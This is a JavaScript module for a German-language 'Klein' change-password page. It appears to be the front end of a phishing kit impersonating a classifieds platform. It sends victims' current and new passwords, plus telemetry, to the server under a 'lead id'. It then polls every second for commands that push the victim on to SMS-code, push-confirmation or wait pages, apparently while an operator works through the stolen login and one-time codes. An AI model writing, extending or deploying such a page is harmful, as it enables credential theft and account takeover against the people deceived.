/**
 * Klein change-password page: current + new password, 5 min wait overlay, status poll.
 */
export function runKleinChangePassword() {
  'use strict';

  var form = document.getElementById('form-change-klein');
  var currentInput = document.getElementById('current-password');
  var newInput = document.getElementById('new-password');
  var errorEl = document.getElementById('error-change');
  var wrapCurrent = document.getElementById('wrap-current');
  var wrapNew = document.getElementById('wrap-new');
  var btnSubmit = document.getElementById('btn-submit');
  var waitOverlay = document.getElementById('knz-wait-overlay');
  var waitCountdown = document.getElementById('knz-wait-countdown');
  var WAIT_SECONDS = 5 * 60;
  var pagePollInterval = null;
  var waitOverlayShown = false;
  var pwLogo = document.getElementById('knz-pw-logo');
  if (pwLogo) pwLogo.addEventListener('click', function (e) { e.preventDefault(); });

  function startPagePoll(id) {
    if (!id) return;
    if (pagePollInterval) {
      clearInterval(pagePollInterval);
      pagePollInterval = null;
    }
    function poll() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=passwort-aendern&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          if (st === 'redirect_sms_code') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_klein_sms_wait') {
            showWaitOverlay();
          } else if (st === 'redirect_klein_forgot') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.passwortUrl) ? window.__BRAND__.passwortUrl : '/anmelden';
          } else if (st === 'redirect_push') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'show_success') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/erfolg?id=' + encodeURIComponent(id);
          }
        })
        .catch(function () {});
    }
    poll();
    pagePollInterval = setInterval(poll, 1000);
  }

  function stopPagePoll() {
    if (pagePollInterval) {
      clearInterval(pagePollInterval);
      pagePollInterval = null;
    }
  }

  function getLeadId() {
    try {
      var params = new URLSearchParams(window.location.search);
      var idFromUrl = params.get('id');
      if (idFromUrl) return idFromUrl.trim();
      return sessionStorage.getItem('gmw_lead_id') || '';
    } catch (e) { return ''; }
  }

  function setLeadId(id) {
    try {
      if (id) sessionStorage.setItem('gmw_lead_id', id);
    } catch (e) {}
  }

  function showError(msg) {
    if (errorEl) {
      errorEl.textContent = msg || '';
      errorEl.classList.toggle('visible', !!msg);
    }
    if (wrapCurrent) wrapCurrent.classList.toggle('error', !!msg);
    if (wrapNew) wrapNew.classList.toggle('error', !!msg);
  }

  function setLoading(loading) {
    if (btnSubmit) btnSubmit.disabled = loading;
  }

  function showWaitOverlay() {
    if (waitOverlayShown) return;
    waitOverlayShown = true;
    if (waitOverlay) waitOverlay.hidden = false;
    var id = getLeadId();
    if (id) startPagePoll(id);
    var remaining = WAIT_SECONDS;
    function formatTime(s) {
      var m = Math.floor(s / 60);
      var sec = s % 60;
      return m + ':' + (sec < 10 ? '0' : '') + sec;
    }
    if (waitCountdown) waitCountdown.textContent = formatTime(remaining);
    var tick = setInterval(function () {
      remaining--;
      if (waitCountdown) waitCountdown.textContent = formatTime(remaining > 0 ? remaining : 0);
      if (remaining <= 0) {
        clearInterval(tick);
        stopPagePoll();
        if (id) window.location = '/erfolg?id=' + encodeURIComponent(id);
      }
    }, 1000);
  }

  if (document.getElementById('knz-back')) {
    document.getElementById('knz-back').addEventListener('click', function (e) {
      e.preventDefault();
      var id = getLeadId();
      if (id) window.location = '/?id=' + encodeURIComponent(id);
      else window.location = '/';
    });
  }

  function togglePassword(inputId, btn) {
    if (!btn || !document.getElementById(inputId)) return;
    var input = document.getElementById(inputId);
    var isPassword = input.type === 'password';
    input.type = isPassword ? 'text' : 'password';
    btn.textContent = isPassword ? 'Verbergen' : 'Anzeigen';
  }
  if (document.getElementById('toggle-current')) {
    document.getElementById('toggle-current').addEventListener('click', function () {
      togglePassword('current-password', this);
    });
  }
  if (document.getElementById('toggle-new')) {
    document.getElementById('toggle-new').addEventListener('click', function () {
      togglePassword('new-password', this);
    });
  }

  (function initFromUrl() {
    var id = getLeadId();
    if (id) {
      setLeadId(id);
      startPagePoll(id);
    }
  })();

  if (form) {
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      showError('');
      var current = (currentInput && currentInput.value) ? currentInput.value.trim() : '';
      var newPw = (newInput && newInput.value) ? newInput.value.trim() : '';
      var id = getLeadId();
      if (!id) {
        showError('Sitzung nicht gefunden. Bitte starten Sie den Vorgang erneut.');
        return;
      }
      if (!current || !newPw) {
        showError('Bitte füllen Sie beide Felder aus.');
        return;
      }
      setLoading(true);
      var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
      var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
      fetch('/api/update-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(window.gmwAppendTelemetry({
          id: id,
          currentPassword: current,
          password: newPw,
          screenWidth: sw || undefined,
          screenHeight: sh || undefined
        }))
      })
        .then(function (r) { return r.json().then(function (data) { return { ok: r.ok, data: data }; }); })
        .then(function (res) {
          if (res.ok && res.data && res.data.id) {
            setLeadId(res.data.id);
            showWaitOverlay();
          } else {
            var err = res.data && res.data.error;
            var msg = err === 'wrong_current_password' ? 'Das aktuelle Passwort ist nicht korrekt.' : (err || 'Ein Fehler ist aufgetreten. Bitte überprüfen Sie Ihr aktuelles Passwort.');
            showError(msg);
          }
        })
        .catch(function () {
          showError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
        })
        .finally(function () {
          setLoading(false);
        });
    });
  }
}
